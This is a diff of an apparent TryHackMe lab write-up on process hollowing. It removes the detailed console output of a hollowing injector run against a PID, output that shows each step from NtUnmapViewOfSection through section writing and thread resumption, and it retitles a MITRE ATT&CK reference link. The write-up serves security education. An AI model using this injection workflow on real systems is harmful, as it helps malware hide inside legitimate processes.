@@ -227,44 +227,7 @@ On the target, find the `PID` of `Powershell` run by `THM-Attacker` (in the Deta
 PS C:\Users\THM-Attacker> cd .\Desktop\
 PS C:\Users\THM-Attacker\Desktop> cd .\Injectors\
 PS C:\Users\THM-Attacker\Desktop\Injectors> .\hollowing-injector.exe 3904
-[+] Created victim process
-        [*] PID 4536
-[+] Replacement executable opened
-        [*] Size 103424 bytes
-[+] Read replacement executable into memory
-        [*] In current process at 0x00bd0000
-[+] Obtained context from victim process's primary thread
-        [*] Victim PEB address / EBX = 0x0039f000
-        [*] Victim entry point / EAX = 0x00da36d0
-[+] Extracted image base address of victim process
-        [*] Address: 0x00da0000
-[+] Hollowed out victim executable via NtUnmapViewOfSection
-        [*] Utilized base address of 0x00da0000
-[+] Replacement image metadata extracted
-        [*] replacementImageBaseAddress = 0x00400000
-        [*] Replacement process entry point = 0x00001268
-[+] Allocated memory in victim process
-        [*] pVictimHollowedAllocation = 0x00da0000
-        [*] Headers written into victim process
-        [*] Section .text written into victim process at 0x00da1000
-                [*] Replacement section header virtual address: 0x00001000
-                [*] Replacement section header pointer to raw data: 0x00000400
-        [*] Section .rdata written into victim process at 0x00da2000
-                [*] Replacement section header virtual address: 0x00002000
-                [*] Replacement section header pointer to raw data: 0x00001200
-        [*] Section .data written into victim process at 0x00da3000
-                [*] Replacement section header virtual address: 0x00003000
-                [*] Replacement section header pointer to raw data: 0x00001e00
-        [*] Section .rsrc written into victim process at 0x00da4000
-                [*] Replacement section header virtual address: 0x00004000
-                [*] Replacement section header pointer to raw data: 0x00002000
-        [*] Section .reloc written into victim process at 0x00dbc000
-                [*] Replacement section header virtual address: 0x0001c000
-                [*] Replacement section header pointer to raw data: 0x00019200
-[+] Victim process entry point set to replacement image entry point in EAX register
-        [*] Value is 0x00da1268
-[+] Resuming victim process primary thread...
-[+] Cleaning up
+...
 PS C:\Users\THM-Attacker\Desktop\Injectors>
 ```
 
@@ -272,4 +235,4 @@ Flag!
 
 ## Resources
 
-* [Process hollowing](https://attack.mitre.org/techniques/T1055/012/)
+* [MITRE: Process hollowing](https://attack.mitre.org/techniques/T1055/012/)
